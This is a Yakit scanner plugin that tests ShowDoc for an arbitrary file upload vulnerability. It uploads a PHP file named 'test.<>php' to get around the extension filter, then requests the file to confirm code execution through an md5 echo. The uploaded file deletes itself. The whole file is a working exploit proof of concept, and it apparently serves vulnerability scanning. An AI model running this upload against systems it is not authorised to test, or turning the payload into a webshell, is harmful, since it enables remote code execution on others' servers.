# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()

handleCheck1 = func(target, port){
    addr1 = str.HostPort(target, port)
    isTls1 = str.IsTLSServer(addr1)

    packet1 = `
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Content-Length: 239
Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
Accept-Encoding: gzip

----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?php echo md5(1);unlink(__FILE__);?>
----------------------------921378126371623762173617--`

    ursp,ureq,_ = poc.HTTP(packet1, 
    poc.params({"target":addr1}),
    poc.https(isTls),
    poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8083"),
    )

    uheader, ubody = str.SplitHTTPHeadersAndBodyFromPacket(ursp)
    u1 = json.loads(ubody)
    u2 = re.Find(string(u1), `url:(.*)`)
    u = re.Find(u2, `/Pu.*.php`)
    println(u)
    return u
    if !str.MatchAllOfSubString(rsp, "HTTP/1.1 200") {
        return
    }

}

handleCheck = func(target,port,u){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET {{params(u)}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0

`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr, "u":u}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    if len(rsp) > 0 {
        if str.MatchAllOfRegexp(rsp, `c4ca4238a0b923820dcc509a6f75849b`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`){
            yakit.Info("%v ShowDoc PageController.class.php任意文件上传漏洞", addr)
            risk.NewRisk(
            addr,risk.title("ShowDoc PageController.class.php任意文件上传漏洞"),
            risk.severity("high"),
            risk.titleVerbose("ShowDoc PageController.class.php任意文件上传漏洞存在"),
            risk.type("文件上传[ShowDoc]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在ShowDoc PageController.class.php任意文件上传漏洞")
            }

    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        u = handleCheck1(result.Target,result.Port)
        handleCheck(result.Target,result.Port,u)
    }

}
